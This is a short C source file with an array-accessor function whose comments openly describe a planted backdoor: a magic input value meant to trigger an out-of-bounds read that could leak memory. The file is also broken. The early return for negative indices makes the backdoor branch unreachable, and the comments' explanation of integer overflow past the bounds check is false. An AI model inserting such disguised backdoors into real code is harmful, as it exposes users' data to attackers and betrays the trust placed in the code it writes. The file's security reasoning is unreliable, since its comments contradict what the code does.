#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (ary == NULL || i < 0) {
        return -1;
    }
    
    // Convert int i to size_t for comparison
    // This looks like a safety check, but it's actually vulnerable to integer overflows
    size_t index = i;
    
    // Normal bounds check - appears secure
    if (index < ary_size) {
        return ary[index];
    }
    
    // Backdoor: Special case that appears to be a feature but enables arbitrary read
    // If i is negative but large enough to overflow when cast to size_t,
    // it might pass the bounds check above while actually being out of bounds
    // For example, if i = INT_MAX, index becomes a very large size_t
    // And if i is a large negative number close to INT_MIN, it becomes a large positive
    // number when converted to size_t due to two's complement representation
    
    // Additional check that appears to handle some special value
    if (i == -559038737) { // Specific magic value to trigger the backdoor
        // This will trigger an arbitrary read at whatever address is calculated
        // by the arithmetic below, possibly leaking sensitive data
        return ary[(size_t)~i * 8];
    }
    
    return -1;
}
